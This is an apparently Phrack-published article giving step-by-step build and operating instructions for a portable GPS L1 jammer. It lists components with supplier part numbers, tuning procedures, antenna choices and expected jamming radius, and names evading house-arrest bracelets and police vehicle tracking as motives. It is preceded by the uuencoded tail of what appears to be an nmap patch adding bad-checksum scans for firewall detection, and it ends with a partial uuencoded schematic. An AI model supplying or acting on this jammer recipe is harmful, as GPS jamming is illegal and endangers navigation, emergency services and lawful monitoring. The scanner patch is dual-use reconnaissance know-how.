M&lt;G1N;RD[(`H@(&quot;`@(&quot;`@?0H@(&quot;`@(&#039;T*0$`@+3$V-#8L,3(@*S$V-C$L,34@
M0$`*(&quot;`@(&quot;!N=6UQ=65R:65S7VED96%L(#T@:6YI=&amp;EA;%]P86-K971?=VED
M=&amp;@[&quot;B`@(&quot;`@:68@*&amp;\N9&amp;5B=6=G:6YG*0H@(&quot;`@(&quot;`@;&amp;]G7W=R:71E*$Q/
M1U]35$1/550L(&quot;)$;VYE(&#039;=I=&amp;@@&lt;F]U;F0@)61&lt;;B(L(&#039;1R:65S*3L*+2`@
M(&quot;!I9B`H&lt;V-A;G1Y&lt;&amp;4@/3T@54107U-#04X@)B8@8VAA;F=E9&quot;`F)B`H=&#039;)I
M97,@*R`Q*2`\(#$P,&quot;D@&gt;PHK(&quot;`@(&amp;EF(&quot;@H&lt;V-A;G1Y&lt;&amp;4]/55$4%]30T%.
M(&#039;Q\(&#039;-C86YT&gt;7!E/3U&quot;04151%!?4T-!3BD@)B8@8VAA;F=E9&quot;`F)B`H=&#039;)I
M97,@*R`Q*2`\(#$P,&quot;D@&gt;PH@(&quot;`@(&quot;`@:68@*&amp;\N9&amp;5B=6=G:6YG*2![&quot;B`)
M;&amp;]G7W=R:71E*$Q/1U]35$1/550L(&quot;)3;&amp;5E&lt;&amp;EN9R!F;W(@,2\R(&#039;-E8V]N
M9&quot;!T;R!O=F5R8V]M92!)0TU0(&amp;5R&lt;F]R(&#039;)A=&amp;4@;&amp;EM:71I;F=&lt;;B(I.PH@
M(&quot;`@(&quot;`@?0H@(&quot;`@(&quot;`@=7-L965P*#4P,#`P,&quot;D[&quot;B`@(&quot;`@?0HK(&quot;`@(&amp;EF
M(&quot;@H&lt;V-A;G1Y&lt;&amp;4]/4)!1%1#4%]30T%.(&#039;Q\(&#039;-C86YT&gt;7!E/3U&quot;04151%!?
M4T-!3BD@)B8@=&#039;)I97,^/3`I&quot;BL@(&quot;`@(&quot;!B&lt;F5A:SL**R`@(&quot;`@(`H@(&quot;!]
M(&#039;=H:6QE*&amp;-H86YG960@)B8@*RMT&lt;FEE&lt;R`\(#$P,&quot;D[(&quot;`@&quot;B`*(&quot;`@;W!E
M;FQI&lt;W0@/2!T97-T:6YG;&amp;ES=#L*0$`@+3$V-C(L-R`K,38X,&quot;PQ,2!`0`H@
M(&quot;!F;W(@*&amp;-U&lt;G)E;G0@/2!O&lt;&amp;5N;&amp;ES=#L@8W5R&lt;F5N=#L@(&amp;-U&lt;G)E;G0@
M/2`H8W5R&lt;F5N=&quot;T^;F5X=&quot;`^/2`P*3\@)G-C86Y;8W5R&lt;F5N=&quot;T^;F5X=%T@
M.B!.54Q,*2![&quot;B`@(&quot;`@:68@*&#039;-C86YT&gt;7!E(#T]($E04%)/5%]30T%.*0H@
M(&quot;`@(&quot;`@861D&lt;&amp;]R=&quot;@F=&amp;%R9V5T+3YP;W)T&lt;RP@8W5R&lt;F5N=&quot;T^&lt;&amp;]R=&amp;YO
M+&quot;!)4%!23U1/7TE0+&quot;!.54Q,+&quot;!03U)47T]014XI.PHM(&quot;`@(&amp;5L&lt;V4@:68@
M*&#039;-C86YT&gt;7!E(&quot;$](%5$4%]30T%.*0HK(&quot;`@(&amp;5L&lt;V4@:68@*&#039;-C86YT&gt;7!E
M(#T]($)!1%1#4%]30T%.*0HK(&quot;`@(&quot;`@861D&lt;&amp;]R=&quot;@F=&amp;%R9V5T+3YP;W)T
M&lt;RP@8W5R&lt;F5N=&quot;T^&lt;&amp;]R=&amp;YO+&quot;!)4%!23U1/7U1#4&quot;P@3E5,3&quot;P@4$]25%]5
M3D9)4D5704Q,140I.PHK(&quot;`@(&amp;5L&lt;V4@:68@*&#039;-C86YT&gt;7!E(#T]($)!1%5$
M4%]30T%.*0HK(&quot;`@(&quot;`@861D&lt;&amp;]R=&quot;@F=&amp;%R9V5T+3YP;W)T&lt;RP@8W5R&lt;F5N
M=&quot;T^&lt;&amp;]R=&amp;YO+&quot;!)4%!23U1/7U5$4&quot;P@3E5,3&quot;P@4$]25%]53D9)4D5704Q,
M140I.PHK(&quot;`@(&amp;5L&lt;V4@:68@*&#039;-C86YT&gt;7!E(3U51%!?4T-!3BD*(&quot;`@(&quot;`@
M(&amp;%D9&#039;!O&lt;G0H)G1A&lt;F=E=&quot;T^&lt;&amp;]R=&#039;,L(&amp;-U&lt;G)E;G0M/G!O&lt;G1N;RP@25!0
M4D]43U]40U`L($Y53$PL(%!/4E1?3U!%3BD[&quot;B`@(&quot;`@96QS90H@(&quot;`@(&quot;`@
M861D&lt;&amp;]R=&quot;@F=&amp;%R9V5T+3YP;W)T&lt;RP@8W5R&lt;F5N=&quot;T^&lt;&amp;]R=&amp;YO+&quot;!)4%!2
M3U1/7U5$4&quot;P@3E5,3&quot;P@4$]25%]/4$5.*3L*0$`@+3$V-S0L-B`K,38Y-BPQ
M,R!`0`H@(&quot;!C;&amp;]S92AR87=S9&quot;D[&quot;B`@(&#039;!C87!?8VQO&lt;V4H&lt;&amp;0I.PH@&quot;BL@
M(&amp;EF(&quot;AO+F)A9&amp;-K&lt;W5M/C`I&quot;BL@(&#039;LO*B!297-E=&quot;!C;W)R96-T(&amp;-K&lt;W5M
M(&amp;9O&lt;B!O=&amp;AE&lt;B!O&lt;&#039;1I;VYS(&amp;QI:V4@+4\@*B\**R`@(&quot;!O+F)A9&amp;-K&lt;W5M
M*RL[&quot;BL@(&quot;`@:68@*&amp;\N=F5R8F]S92`F)B!T87)G970M/G!O&lt;G1S+G-T871E
M7V-O=6YT&lt;UM03U)47U5.1DE215=!3$Q%1%T]/6YU;7!O&lt;G1S*0HK(&quot;`@(&quot;`@
M97)R;W(H(BAN;R!F:7)E=V%L;&quot;!R97!L&gt;2!D971E8W1E9&quot;DB*3L**R`@?0HK
M(&quot;`*(&quot;`@+RH@4W5P97(@&lt;V-A;B!R96QI97,@;VX@=7,@&lt;F5C96EV:6YG(&amp;$@
M&lt;F5S&lt;&amp;]N&lt;V4@:68@=&amp;AE(&#039;!O&lt;G0@:7,*(&quot;`@(&quot;`@0TQ/4T5$(&amp;%N9&quot;!N;R!R
M97-P;VYS92!I9B!T:&amp;4@&lt;&amp;]R=&quot;!I&lt;R!/4$5.+B`@02!P&lt;F]B;&amp;5M(&#039;=I=&amp;@*
M(&quot;`@(&quot;`@=&amp;AI&lt;R!I&lt;R!T:&amp;%T(&#039;=H96X@82!M86-H:6YE(&amp;ES(&amp;1O:6YG(&amp;AE
M879Y(&amp;9I;&#039;1E&lt;FEN9RP@86QL(&#039;!O&lt;G1S&quot;D!`(&quot;TQ-C@Q+#&lt;@*S$W,3`L-R!`
M0`H@(&quot;`@(&quot;!P;W)T&lt;R!W97)E(&#039;-C86YN960@86YD(&#039;1H97D@87)E($%,3&quot;!C
M;VYS:61E&lt;F5D(&amp;]P96X@8GD@=&amp;AI&lt;PH@(&quot;`@(&quot;!F=6YC=&amp;EO;BP@=&amp;AE;B!I
M=&quot;!I&lt;R!R96%S;VYA8FQY(&#039;1O(&amp;%S&lt;W5M92!T:&amp;%T(&#039;1H92!214%,(&#039;)E87-O
M;@H@(&quot;`@(&quot;!T:&amp;5Y(&amp;%R92!A;&amp;P@;W!E;B!I&lt;R!T:&amp;%T(&#039;1H97D@:&amp;%V92!B
M965N(&amp;9I;&#039;1E&lt;F5D+B`J+PHM(&quot;!I9B`H;G5M&lt;&amp;]R=&#039;,@/B`R-2D@&gt;R`@(&quot;`*
M*R`@96QS92!I9B`H;G5M&lt;&amp;]R=&#039;,@/B`R-2D@&gt;R`@(&quot;`*(&quot;`@(&quot;!I9B`H&lt;V-A
M;G1Y&lt;&amp;4@/3T@54107U-#04XI(&#039;L*(&quot;`@(&quot;`@(&amp;EF(&quot;AT87)G970M/G!O&lt;G1S
M+G-T871E7V-O=6YT&lt;U]U9&#039;!;4$]25%]/4$5.72`]/2!N=6UP;W)T&lt;RD@&gt;PH@
M&quot;6EF(&quot;AO+G9E&lt;F)O&lt;V4I(&#039;L@&quot;F1I9F8@+75R3F(@;FUA&lt;&quot;TS+C$P04Q02$$T
M+W1A&lt;F=E=&#039;,N8V,@;FUA&lt;&quot;TS+C$P04Q02$$T+6)A9&quot;]T87)G971S+F-C&quot;BTM
M+2!N;6%P+3,N,3!!3%!(030O=&amp;%R9V5T&lt;RYC8PE3=6X@4V5P(&quot;`X(#(R.C4V
M.C`Q(#(P,#(**RLK(&amp;YM87`M,RXQ,$%,4$A!-&quot;UB860O=&amp;%R9V5T&lt;RYC8PE4
M:&#039;4@1&amp;5C(#$R(#`W.C4R.C0U(#(P,#(*0$`@+3(P.&quot;PW(&quot;LR,#@L-R!`0`H@
M&quot;2`@(&quot;`H*&quot;IP:6YG=&#039;EP92`F(%!)3D=465!%7U1#4&quot;D@?&#039;P@&quot;B`)(&quot;`@(&quot;!O
M+G-Y;G-C86X@?&#039;P@;RYF:6YS8V%N(&#039;Q\(&amp;\N&gt;&amp;UA&lt;W-C86X@?&#039;P@;RYN=6QL
M&lt;V-A;B!\?&quot;`*(`D@(&quot;`@(&amp;\N:7!P&lt;F]T&lt;V-A;B!\?&quot;!O+FUA:6UO;G-C86X@
M?&#039;P@;RYI9&amp;QE&lt;V-A;B!\?&quot;!O+F%C:W-C86X@?&#039;P@&quot;BT)(&quot;`@(&quot;!O+G5D&lt;&#039;-C
M86X@?&#039;P@;RYO&lt;W-C86X@?&#039;P@;RYW:6YD;W=S8V%N*2D@&gt;PHK&quot;2`@(&quot;`@;RYU
M9&#039;!S8V%N(&#039;Q\(&amp;\N;W-S8V%N(&#039;Q\(&amp;\N=VEN9&amp;]W&lt;V-A;B!\?&quot;!O+F)A9&#039;1C
M&lt;&#039;-C86X@?&#039;P@;RYB861U9&#039;!S8V%N*2D@&gt;PH@&quot;2`@&lt;W1R=6-T(&#039;-O8VMA9&amp;1R
M7VEN(&quot;IS:6X@/2`H&lt;W1R=6-T(&#039;-O8VMA9&amp;1R7VEN(&quot;HI(&quot;9S&lt;SL*(`D@(&#039;-S
M;&amp;5N(#T@&lt;VEZ96]F*&quot;IS:6XI.PH@&quot;2`@&lt;VEN+3YS:6Y?9F%M:6QY(#T@049?
M24Y%5#L*9&amp;EF9B`M=7).8B!N;6%P+3,N,3!!3%!(030O=&amp;-P:7`N8V,@;FUA
M&lt;&quot;TS+C$P04Q02$$T+6)A9&quot;]T8W!I&lt;&quot;YC8PHM+2T@;FUA&lt;&quot;TS+C$P04Q02$$T
M+W1C&lt;&amp;EP+F-C&quot;4UO;B!.;W8@,3$@,3@Z,#,Z-#4@,C`P,@HK*RL@;FUA&lt;&quot;TS
M+C$P04Q02$$T+6)A9&quot;]T8W!I&lt;&quot;YC8PE4:&#039;4@1&amp;5C(#$R(#`W.C4U.C,P(#(P
M,#(*0$`@+3(R-BPV(&quot;LR,C8L,3$@0$`*(&#039;-U;2`@/2`H&lt;W5M(#X^(#$V*2`K
M(&quot;AS=6T@)B`P&gt;&amp;9F9F8I.R`@(&quot;`O*B!A9&amp;0@:&amp;EG:&quot;TQ-B!T;R!L;W&lt;M,38@
M*B\*(&#039;-U;2`K/2`H&lt;W5M(#X^(#$V*3L@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`O
M*B!A9&amp;0@8V%R&lt;GD@*B\*(&amp;%N&lt;W=E&lt;B`](&#039;YS=6T[(&quot;`@(&quot;`@(&quot;`@(&quot;\J(&amp;]N
M97,M8V]M&lt;&amp;QE;65N=&quot;P@=&amp;AE;B!T&lt;G5N8V%T92!T;R`Q-B!B:71S(&quot;HO&quot;BL*
M*R\J($)A9&quot;!#:&amp;5C:W-U;2!38V%N&lt;SH@5V4@;75S=&quot;!B92!S=7)E(&#039;1H870@
M=&amp;AE(&amp;-H96-K&lt;W5M(&amp;ES(&#039;)A;F1O;2!A;F0@8G)O:V5N(&quot;HO&quot;BMI9B`H(&amp;\N
M8F%D8VMS=6T@/3T@,2`I&quot;BL@(&amp;%N&lt;W=E&lt;B`](&quot;AA;G-W97(M,2D@)B!G971?
I&lt;F%N9&amp;]M7W5S:&amp;]R=&quot;@I.PHK&quot;B!R971U&lt;FXH86YS=V5R*3L*(&#039;T*(`H`
`
end

|=[ EOF ]=---------------------------------------------------------------=|


--------------------------------------------------------------------------------


                             ==Phrack Inc.==

               Volume 0x0b, Issue 0x3c, Phile #0x0d of 0x10

|=-----------------=[ Low Cost and Portable GPS Jammer ]=----------------=|
|=-----------------------------------------------------------------------=|
|=---------------=[ anonymous &lt;p60_0d@author.phrack.org ]=---------------=|

--[ Contents

  1 - Project Overview

  2 - Why?

  3 - Technical Description
    3.1 - Phase Locked Loop
    3.2 - Noise Generator
    3.3 - RF Amplifiers
    3.4 - Voltage Regulation
    3.5 - Antenna

  4 - Construction Notes
    4.1 - Component Purchasing
    4.2 - Layout

  5 - Operation

  6 - References

  Appendix A: Links to Datasheets

  Appendix B: Schematic Diagram - gps_jammer.ps.gz (uuencoded)


--[ 1 - Project Overview
 
  A low cost device to temporarily disable the reception of the civilian
course acquisition (C/A) code used for the standard positioning service
(SPS)[1] on the Global Positioning System (GPS/NAVSTAR) L1 frequency of
1575.42 MHz.

  This is accomplished by transmitting a narrowband Gaussian noise signal,
with a deviation of +/- 1.023 MHz, on the L1 GPS frequency itself.  This
technique is a little more complicated than a simple continuous wave (CW)
jammer, but tends to be more effective (i.e. harder to filter) against
spread spectrum based radio receivers.

  This device will have no effect on the precise positioning service (PPS)
which is transmitted on the GPS L2 frequency of 1227.6 MHz and little
effect on the P-code which is also carried on the L1 frequency.  There may
be a problem if your particular GPS receiver needs to acquire the P(Y)-code
through the C/A-code before proper operation.

  This device will also not work against the new upcoming GPS L5 frequency
of 1176.45 MHz or the Russian GLONASS or European Galileo systems.  It can
be adapted to jam the new civilian C/A-code signal which is going to also
be transmitted on the GPS L2 frequency.

  That said, it will work against the majority of consumer/OEM GPS
receivers, provided they are not setup in any advanced anti-jam
configuration.

---[ 2 - Why?

  The onslaught of cheap GPS based navigation (or hidden tracking devices)
over the past few years has made it necessary for the typical citizen to
take up the fine art of electronic warfare.

  Several companies[2] now sell &quot;hidden&quot; GPS based tracking devices which
mount inside or underneath your vehicle.  Some transmit the coordinates,
via cellular phone, of your vehicle&#039;s present and/or past locations for
weeks at a time without battery changes or court orders!

  Vehicle rental companies have been known to use GPS tracking devices to
verify you don&#039;t speed or abuse their rental vehicles.  The unsuspecting
renter is often faced with these hidden abuse &quot;fees&quot; after returning the
rental vehicle.

  Law enforcement agencies are dumb enough to keep track of house arrest
prisoners with simple GPS based tracking bracelets[3].  Some even use GPS
for automatic vehicle location (AVL) on their squad cars to allow the
dispatchers to send in the closest unit to a particular call or to know an
officer&#039;s location in case of an emergency situation where they can&#039;t use
their radio.

  Cellular phone companies, trucking companies, private investigators,
toll-roads, aircraft, those &quot;protect your child&quot; systems and many more
services are all fully involved with the use of GPS based tracking.  The
problem is, do you really want everyone to know where you are?

---[ 3 - Technical Description

  This will be a brief description of each of the major sections which
compromise the entire jammer device.  Refer to the included schematic
diagram (Appendix B) as you read along.  You should also refer to the
component&#039;s datasheets for even more detailed information.

---[ 3.1 - Phase Locked Loop

  The jammer&#039;s main oscillator components consist of a Motorola MC145151
phase-locked loop (PLL) frequency synthesizer chip, a Micronetics M3500-
1324S voltage controlled oscillator (VCO) module and a Fijitsu MB506 divide
-by-256 prescaler chip.

  The VCO feeds a portion of its radio frequency (RF) output signal into
the prescaler chip, where it is divided by 256.  A 1575 MHz signal would be
turned into a 6.15234375 MHz signal.  This is then fed into one side of the
PLL chip.

  The other side of the PLL is fed with a reference frequency which is
derived from a 10 MHz quartz crystal.  This crystal reference frequency is
divided down 512 times by the PLL to reach 19531.25 Hz.  The 6.15234375
MHz prescaler output frequency is also further divided down 315 times by
the PLL chip for a final frequency of 19531.25 Hz.  This will be the new
PLL internal reference frequency.  That big bad 1575 MHz microwave signal
now looks like a simple audio frequency to the PLL chip and the supporting
components.

  The PLL chip internally compares the phase of the 19531.25 Hz VCO side
signal to the phase of the 19531.25 Hz crystal side signal.  The PLL chip
outputs high or low voltage pulses depending on whether the crystal signal
is leading or lagging in phase with the VCO signal.  These pulses are then
filtered and dampened into a pure DC control signal via a simple passive
loop filter.  This cleaned up signal is then connected to the VCO&#039;s voltage
tune control input.

  When everything is working properly, the VCO&#039;s output frequency is locked
to whatever frequency you programmed into the PLL chip, 1575 MHz in this
case.  It will stay on that frequency even through dramatic temperature
changes, a problem that a non-PLL VCO would have.  If the PLL is not
working properly, the red &quot;PLL Unlock&quot; LED will be lit.

  Due to a quirk with using low cost, easy to obtain components, you&#039;ll
need to tweak two loading capacitors on the reference crystal.  This is
unusual, but necessary to move the signal from the default 1575 MHz to
the more appropriate 1575.42 MHz (+/- a few hundred Hertz).  This is a very
important and delicate procedure, and you&#039;ll need a frequency counter to
accomplish it.

---[ 3.2 - Noise Generator

  The actual noise generator of the jammer is very simple.  A 6.8 Volt
Zener diode is first biased, buffered and amplified by a single 2N3904
transistor.  This single Zener diode is capable of generating broadband
noise signals from audio frequencies up to over 100 MHz.  We then filter
this noise signal down to something more practical and something which the
VCO module can actually respond too.  This is done via the LM386 audio
amplifier chip.  The LM386 both amplifies and low pass filters the final
noise signal.  The final LM386 output signal will have enough overhead if
you need to adapt it for a wideband noise jammer.

  This low frequency noise signal is fed, via a 100 Ohm potentiometer, to
a simple resistor/capacitor network where it&#039;s mixed with the VCO voltage
tune control signal (described above).  The single 1N4148 diode is to
prevent any negative voltage pulses from reaching the VCO.

  This mixing results in a new &quot;noisy&quot; voltage tune control signal feeding
the VCO.  The resulting RF signal looks like random noise dancing around
the center 1575.42 MHz RF carrier.  You&#039;ll need to set the deviation of
this noise to approximately +/- 1.023 MHz from the 1575.42 MHz RF carrier.
Access to a spectrum analyzer is required to do this properly, or you can
use an oscilloscope and the included test point voltages to get an
approximate setup.

---[ 3.3 - RF Amplifiers

  The VCO&#039;s +7 dBm (5 milliwatts) RF output is first slightly attenuated
(4 dB) and tapped for the MB506 prescaler input.  It then passes through to
the RF amplifier stages and band pass filter.

  The first RF amplifier is a Sirenza Microdevices SGA-6289.  It provides
about 13 dB of gain to overcome the losses from the resistive attenuation
pad.  It also shows a good 50 Ohm termination for the VCO RF output and
even helps to drive the final RF amplifier.

  The GPS band pass filter is a 2-pole Toko 4DFA-1575B-12 ceramic
dielectric filter from Digi-Key[4], part number TKS2609CT-ND.  This part is
optional, but helps clean up the RF spectrum before further amplification.
The filter&#039;s insertion loss is around 2 dB.

  The final RF amplifier is a WJ Communications AH102.  It provides another
13 dB of gain, with a higher P1dB compression point of around +27 dBm (500
mW).  The AH102 draws the most current of any part, and is not really
necessary if you&#039;re aiming for a low range, low current, battery operated
device.

---[ 3.4 - Voltage Regulation

  Voltage input regulation and filtering is done using standard voltage
regulator ICs.  A LM2940CT-12 12 Volt, 1 Amp low dropout voltage regulator
is used to regulate the main 12 Volt power line.  Standard 78xx series
regulators are used from there on to provide both the 9 and 5 Volt lines.
A simple diode/fuse polarity protection scheme is also provided on the
battery input.  The use of an automatic reset fuse is highly recommended.

  You can power the jammer off a common 12 Volt rechargeable battery.
The 12 Volt, 4.5 Amp-hour, lead-acid battery from Radio Shack[5], part
number 23-289, is a good choice.  Old car batteries, strings of 6 Volt
lantern batteries or even solar panels will also work.  Current draw for
the completed jammer will be around 300 milliamps.

---[ 3.5 - Antenna

  A radiating antenna is not shown in the schematic diagram and one will
need to be purchased or constructed for proper operation.  There are
numerous commercial GPS receiving antennas which will work fine for this
low power transmitting application.  Some of the best pre-made or easily
assembled microwave antennas can be purchased directly from Ramsey
Electronics[6].

  The Ramsey DA25 broadband discone antenna is recommended for omni-
directional (transmit in a circle) radiating applications.  The LPY2 log
periodic Yagi antenna can be used for directional (transmit in a straight
line) radiating applications.  Using a directional antenna will give you a
slight increase in overall transmitted RF power, which increases the
jammer&#039;s range, and can also be used to shield your own GPS receiver from
being jammed (i.e. point it at the enemy).

  Dielectric GPS patch antenna elements may also be purchased from Digi-
Key.  Toko DAK series elements, Digi-Key part number TK5150-ND, are perfect
for surface mounting directly to the circuit board.  They will require a
plastic radome to slightly lower their resonant frequency.  The small
antenna element size is also perfect for hidden or portable operations.

---[ 4 - Construction Notes

  Unfortunately, proper jammer construction will require fairly advanced
engineering skills.  Prior knowledge of high frequency microwave circuits
and printed circuit board (PCB) design is required.  A good start for the
beginner is by reading the &quot;UHF/Microwave Handbook&quot; and &quot;The ARRL Handbook&quot;
both published by the Amateur Radio Relay League (ARRL)[7].  Access to
fundamental RF test equipment (oscilloscope, frequency counter, spectrum
analyzer, loads, attenuators, etc.) is also required.

---[ 4.1 - Component Purchasing

  The main VCO module and RF amplifiers can be purchased from Richardson
Electronics[8].  Part number M3500C-1324S for the VCO module and part
numbers SGA-6289 and AH102 for the RF amplifiers.  Equivalent VCO and RF
amplifiers can be purchased from companies such as Mini-Circuits[9] or
Synergy Microwave[10].  Slight component changes may be required if using
alternate components to take into account different operating voltages and
input/output RF power requirements.  The PLL loop filter may also need
tweaking if you use a different VCO module.

  The MC145151 PLL synthesizer chip can be purchased from Digi-Key.  There
are several pin packages available (leaded or surface mount), choose the
one suitable for your application.  The small 28-SOIC surface mount package
is part number MC145151DW2-ND.  You may also be able to salvage MC145151
chips from older CB radios or older C-band satellite receivers (the kind
that where tuned via DIP switches).

  Digi-Key also handles an equivalent prescaler IC, the NEC UPG1507GV, part
number UPB1507GV-ND.  This is an exact replacement for the Fijitsu MB506,
but the main drawback to the UPG1507GV is that it is in a 8-SSOP package
(i.e. very small) and is fairly difficult to work with using standard
soldering tools.

  The 10 MHz crystal is also available from Digi-Key, part number
300-6121-1-ND.  Other miscellaneous components may also be purchased from
Digi-Key (capacitors, resistors, voltage regulators, inductors,
diodes, transistors, LM386, project box, RF connectors, etc.) as their
prices are the most competitive and their service is outstanding.

---[ 4.2 - Layout

  No PCB pattern is available, you&#039;ll have to layout the project by hand
using felt-tip markers, drafting tape, dry-etch or iron-on transfers.  You
should make your own PCB pattern to fit your application specifically.

  The PCB layout isn&#039;t that difficult or challenging, but will require
prior experience and patience.  Using all surface mount components and good
board layout practices will reduce the jammer&#039;s physical size and cost
tremendously.

  The use of high frequency, double sided copper clad laminate is essential
for properly working microwave circuits.  GIL Technologies[11] GML1000
(2-side, 1 oz., 0.030&quot;) is a good choice but standard FR-4 laminate will
work in a pinch.  You can purchase 6&quot; x 6&quot; FR-4 (2-side, 1 oz., 0.030&quot;)
laminate from Digi-Key, part number PC45-S-ND.

  A 50 Ohm micro stripline on 0.030&quot; GML1000 PCB laminate will be about 70
mils (1.8 mm) wide and on FR-4 it will be about 55 mils (1.5 mm) wide.  Be
sure to keep any micro stripline carrying RF signals short, straight and
perpendicular to any DC bias line or any other micro stripline it has to
cross.
  
  The 2 mm wide line in the dry-etch transfer package from Radio Shack,
part number 276-1490, will work O.K. on both materials for creating
homebrew micro striplines which are close enough to 50 Ohms.

  The two RF amplifiers, band pass filter, VCO and prescaler PCB patterns
will all require numerous ground vias connecting the top and bottom ground
planes.  These help prevent ground loops and instability (oscillations)
from disrupting proper circuit operation.  In the case of the AH102, they
even provide some heat sinking to allow cooler operation of the final RF
amplifier.

  Any resistors, capacitors or inductors used in the RF sections should be
in a 0603, 0805 or 1206 size surface mount package.  Leaded components will
not work at this high of a frequency.  Be sure your choice of surface mount
inductors can handle the current when used as part of the DC bias on the
RF amplifiers.  The ferrite bead shown in the schematic can be any salvaged
ferrite bead.  The inductor assortment package at Radio Shack, part number
273-1601 should have a couple of them in it.

--[ 5 - Operation

  Once the jammer is operational, you can practice testing it by monitoring
the signal on a common consumer GPS receiver or high quality communications
receiver.  A GPS receiver close to the jammer will not be able to acquire
C/A-code lock and any operating GPS in the jammer&#039;s radiation pattern will
lose C/A-code lock.  Higher quality GPS receivers tend to be less
susceptible to low power jamming, so you&#039;ll need to be in the antenna&#039;s
near-field radiation pattern (i.e. close) for it to work.

  Any obstructions near the jammer&#039;s own antenna (trees, houses, hills,
walls, etc.) will decrease the jamming range.  The best placement is where
the jammer&#039;s antenna is line-of-sight to the antenna of the GPS receiver
you&#039;re trying to jam.  Real world results will vary drastically, but you
should be able to obtain a jam radius of a few hundred feet even in heavily
obstructed areas with the higher power (AH102) option and a simple antenna.

  You can even practice counter-jamming methods to protect yourself against
hostile or accidental GPS jamming.  Try to shield your GPS receiver from
the interference source by placing your body, trees, hills, rocks or other
obstructions in-between your position and the interference.  More advanced
methods involve using directional or steerable phased-array antennas on
your GPS receiver (pointed skyward) to nullify any ground based
interference.

--[ 6 - References

[1] Standard Positioning Service (SPS) Signal Specification
    http://www.spacecom.af.mil/usspace/gps_support/gps_documentation.htm

[2] GPS-Web
    http://www.gps-web.com

    Travel Eyes 2
    http://www.spyyard.com/details_traveleyes2.htm

[3] VeriTrack
    http://www.veridian.com/offerings/suboffering.asp?offeringID=472

    iSECUREtrac
    http://www.isecuretrac.com

    Pro Tech Monitoring
    http://www.ptm.com

[4] Digi-Key
    http://www.digikey.com

[5] Radio Shack
    http://www.radioshack.com

[6] Ramsey Electronics
    http://www.ramseyelectronics.com

[7] Amateur Radio Relay League
    http://www.arrl.org

[8] Richardson Electronics
    http://www.rell.com

[9] Mini-Circuits
    http://www.minicircuits.com

[10] Synergy Microwave
     http://www.synergymwave.com

[11] GIL Technologies
     http://www.gilam.com

[12] Xcircuit
     http://xcircuit.ece.jhu.edu

--[ Appendix A: Links to Datasheets

Alternate component manufactures may be substituted in most cases.

* Fairchild Semiconductor 2N3904 NPN Transistor
  http://www.fairchildsemi.com/ds/2N/2N3904.pdf

* Micronetics M3500-1324S VCO
  http://www.micronetics.com/pdf/vco1324.pdf

* Motorola MC145151 PLL Frequency Synthesizer
  http://e-www.motorola.com/brdata/PDFDB/docs/MC145151-2.pdf

* National LM2940-12 Voltage Regulator
  http://www.national.com/ds/LM/LM2940.pdf

* National LM386 Audio Amplifier
  http://www.national.com/ds/LM/LM386.pdf

* National LM78L05 Voltage Regulator
  http://www.national.com/ds/LM/LM78L05.pdf

* NEC UPB1506/07GV Prescaler
  http://www.cel.com/pdf/datasheets/upb1506.pdf

* Sirenza Microdevices SGA-6289 RF Amplifier
  http://www.sirenza.com/pdf/datasheets/sga/89/sga-6289.pdf

* STMicroelectronics 78M09 Voltage Regulator
  http://eu.st.com/stonline/books/pdf/docs/2146.pdf

* Toko DAK1575MS50T Dielectric Antenna
  http://www.toko.com/passives/antennas/pdf/DAK1575MS50Tws.pdf

* Toko 4DFA-1575B-12 Dielectric Band Pass Filter
  http://www.toko.com/passives/filters/dielectric/4dfa.html

* WJ Communications AH102 RF Amplifier
  http://www.wj.com/pdf/AH102.pdf

--[ Appendix B: Schematic Diagram - gps_jammer.ps.gz (uuencoded)

  Below is the schematic diagram (gps_jammer.ps) in an uuencoded gzipped
PostScript file.  This is the native Xcircuit[12] format and is used for
ease of viewing, printing and modification.

&lt;++&gt; ./gps_jammer.ps.gz.uue

begin 644 gps_jammer.ps.gz
M&#039;XL(&quot;&amp;A2XST``V=P&lt;U]J86UM97(N&lt;&#039;,`[7UKCQNYLMAGZU&lt;P&quot;`QHL5&lt;SW&gt;RW
MD1/$&#039;MN[&gt;ZX?$X_W$62#A4;JF=%:H]:1-&#039;X&lt;8_][ZL%7=Y/J&#039;I\)@@1WX94X
MS6*Q6&quot;P6JXK%UN/_=&#039;XQ&gt;[IL+NM9&lt;A*)%^&lt;7+[$P&gt;?SX_&gt;JPKI^(Z^W^CS_G
MM[?U#IZ=[&gt;KYH=D]$;\M5KO%W&gt;H@/LJ33%&gt;LFLWS^0&#039;:O+^KQ9OFHY&quot;YB-(G
MF7PB4R&amp;C2`+@^?RZWC\1,12?-7&gt;;Y6IS_:SY_$3D)?Z+JZ(459)#[?-F&lt;7=;
M;PYOZGI9+]_5^^9NM\&quot;F5\WF(&#039;ZLUQ_KPVHQ[_PY&gt;]:LEP*:?]^M&gt;&#039;NY7OT#
MZ/+`MZK&gt;KV[K_&gt;Q=&lt;SO?\(.++[&gt;7S1IQOM@LSYI;)&amp;J/Y-?7J\WYKEDWUY/&#039;
MD\=&quot;G#?[P\5BM]H&gt;Q)8&gt;0_N=:.X.V[N#N-HUM^*SXAI&quot;_U+O]L&quot;P)T*&gt;I-S^
MQ;I&gt;&#039;&#039;9`U%IH[D[GFZ5H#C?U[M-J7XOK&gt;E/OYNOOQ&#039;(W_P2&lt;PWZN=_-;;O_K
M;G4XU!MQ^04&#039;(5XL/\UWR[TH3[/3*IG-LM,X/XUB(::&#039;U&gt;U_NYPO;D[J17WR
MY\W=2;V\^PXQO+^IQ=^;F\U&gt;_-AL/ZS@^^?-ZB,2&gt;OB&quot;??&quot;8]5P\P&gt;X7^_H@
M?CO[Z=T9_H&amp;#P;D5^[OMMMD=D,9E?;7:K%`X]F(VFPD8#0QEOJNQ!&quot;A6M_/=
M%\,:&lt;?BRK?&lt;GD\DI(=W//]:&quot;/@#-Y/30;&amp;_G!P&#039;_[U:?Q&gt;)NMX/)4&#039;\AP.04
MIVR_GL.\?16G7*@_+VZP5OS/6$2&quot;GV$I^E]B(N`_J@&lt;:ES3=]-?M_$--?RWO
MMF)=;ZX/@&amp;&amp;U.(C3#7UIE-3^*V&quot;#UO5G&lt;?KRI^=B4\,3!DN@!B1A+5`&quot;_H+&#039;
MVV9+__\E5E?U&amp;MCP%\K(?+TF1-R(^,6]`^A?//&quot;[-;1&amp;8I`],#`8,1&quot;%Y?H?
M8G_3?+I:SZ^A-_@+1&gt;:KN&quot;:F(5K%I6VS`HR*@3!IBFO`!G&#039;;P&amp;)HA%2C8.2?
